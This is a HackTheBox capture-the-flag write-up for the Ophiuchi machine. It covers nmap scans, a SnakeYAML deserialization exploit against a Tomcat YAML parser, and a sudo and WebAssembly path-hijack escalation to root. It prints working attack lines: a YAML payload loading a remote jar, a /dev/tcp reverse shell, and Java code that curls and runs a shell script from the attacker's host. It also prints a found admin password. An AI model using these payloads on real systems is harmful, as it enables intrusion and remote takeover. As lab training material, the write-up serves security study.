# Ophiuchi Hackthebox Writeup

## All Ports Scan

```bash
# Nmap 7.91 scan initiated Sat Jul  3 12:56:03 2021 as: nmap -T4 -sT -vv -p- -oA nmap/allports 10.10.10.227
Warning: 10.10.10.227 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.227
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2021-07-03 12:56:03 -06 for 897s
Not shown: 65532 closed ports
Reason: 65532 conn-refused
PORT      STATE    SERVICE    REASON
22/tcp    open     ssh        syn-ack
8080/tcp  open     http-proxy syn-ack
33797/tcp filtered unknown    no-response

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jul  3 13:11:00 2021 -- 1 IP address (1 host up) scanned in 896.80 seconds
```

## Complete Scan

```bash
# Nmap 7.91 scan initiated Sat Jul  3 12:58:28 2021 as: nmap -T4 -sT -sC -sV -A -vv -p22,8080 -oA nmap/complete 10.10.10.227
Nmap scan report for 10.10.10.227
Host is up, received reset ttl 63 (0.15s latency).
Scanned at 2021-07-03 12:58:28 -06 for 19s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpzM/GEYunOwIMB+FyQCnOaYRK1DYv8e0+VI3Zy7LnY157q+3SITcgm98JGS/gXgdHQ4JnkCcXjUb9LaNRxRWO+l43E9v2b2U9roG8QetbBUl5CjJ0KHXeIwNgOcsqfwju8i8GA8sqQCELpJ3zKtKtxeoBo+/o3OnKGzT/Ou8lqPK7ESeh6OWCo15Rx9iOBS40i6zk77QTc4h2jGLOgyTfOuSGTWhUxkhqBLqSaHz80G7HsPSs1BA9zAV8BOx9WmtpMsgDcNG14JAQQd904RCzgw0OaQ0J6szs78Us8Piec0rF/T4b1H3sbUedOdA0QKgGbNojObVrz5VwOw6rqxbs1gZLePXB5ZNjm0cp+Sen8TkRkdUf7Sgw92B//RhSoIakp1u5eOPs/uJ6hyCholUnerl3WK8NPB9f9ICPYq8PbvVMu6zcytV/cCjwxFloWB989iyuqG/lYcdMhGJlAacOFy5TRcTB8c5Qlmtl44J/4dyuCJAhj5SY6TRdcSxhmz0=
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM79V2Ts2us0NxZA7nnN9jor98XRj0hw7QCb+A9U8aEhoYBcrtUqegExaj/yrxjbZ/l0DWw2EkqH4uly451JuMs=
|   256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO31s/C33kbuzZl9ohJWVEmLsW9aqObU6ZjlpbOQJt0C
8080/tcp open  http    syn-ack Apache Tomcat 9.0.38
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Parse YAML
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=7/3%OT=22%CT=%CU=44516%PV=Y%DS=2%DC=T%G=N%TM=60E0B367%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 40.475 days (since Mon May 24 01:35:04 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   154.26 ms 10.10.14.1
2   154.28 ms 10.10.10.227

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  3 12:58:47 2021 -- 1 IP address (1 host up) scanned in 19.35 seconds
```

## Port 8080 Enumeration

Yaml Parse page is running nothing more.

![](Images/Pasted%20image%2020210704002925.png)

While searching for exploit got one blog about yaml paraser deserialization.

https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858

 So, I created a simple request to my system from the server ip using the simple payload.
 
 ```java
 !!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://ATTACKER-IP/"]
)
]
```

After running it on server we got a request.

![](Images/Pasted%20image%2020210704003718.png)

And it shows it is vulnerable to deserilization, 

And we got a exploit on github about yaml parser deserilization.

```bash
Exploit : https://github.com/artsploit/yaml-payload
```

Exploit Mwthod :

### 1. Genrating Shell Script

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.137/443 0>&1
```

### 2. Editing into the AwesomeScriptEngineFactory.java

So i edited into the file AwesomeScriptEngineFactory.java with my payload.

```java
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl http://10.10.14.137/shell.sh -o /tmp/shell.sh");
            Runtime.getRuntime().exec("bash /tmp/shell.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

### 3. Creating a Malicious Payload.

```java
# javac src/artsploit/AwesomeScriptEngineFactory.java
# jar -cvf yaml-payload.jar -C src/ .
```

And we see that our payload is created with a name called yaml-payload.jar

![](Images/Pasted%20image%2020210704004616.png)

Now next part is to download and execute it into the machine.

Once the command is executed then we got a shell.

```java
!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://10.10.14.137/yaml-payload.jar"]
)
]
```

![](Images/Pasted%20image%2020210704011524.png)

And here we are in the box.

## Previlege Escalation

While looking to the user and directories we are tomcat,
so first thing i searched is about tomcat user file.

![](Images/Pasted%20image%2020210704012132.png)

And here we got the credentials

```xml
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
```

And now we are admin.

![](Images/Pasted%20image%2020210704012329.png)

## Previlege Escalation root.

And now

![](Images/Pasted%20image%2020210704012442.png)

we've previlege to run 

```bash
(ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

While looking at the index.go we observed it is importing wasm from github.com/wasmerio/wasmer-go/wasmer

Let's look into that

While looking into the file we observed two things.

![](Images/Pasted%20image%2020210704013603.png)

First it uses main.wasm file.

Second there is a condition statement.

if the condition is true the script prints "Not ready to deploy"
else it execute the binary called deploy.sh.

But thing is to be noted there is no path mention for the deploy.sh,

So we can create a malicious to execute the file and also we have to manage the conditon to false.

While searhing for a way to read .wasm file i got a github repo

https://github.com/WebAssembly/wabt

Then i imported a main.wasm file in my local system using scp.

![](Images/Pasted%20image%2020210704014233.png)

Then i use wasm2wat 

```java
# apt install wabt
# wasm2wat main.wasm > main.wat
# wat2wasm main.wat
```

While looking into the file.

![](Images/Pasted%20image%2020210704014630.png)

It has a 32bit integer value set to 0, so i replaced this value to 1 and compiled it again to .wasm

Using wasm2wat

![](Images/Pasted%20image%2020210704015212.png)

Download it to the machine. 

Then i created a file deploy.sh

![](Images/Pasted%20image%2020210704015336.png)

Then i created a new user rootme.

![](Images/Pasted%20image%2020210704015730.png)

And now we are root.
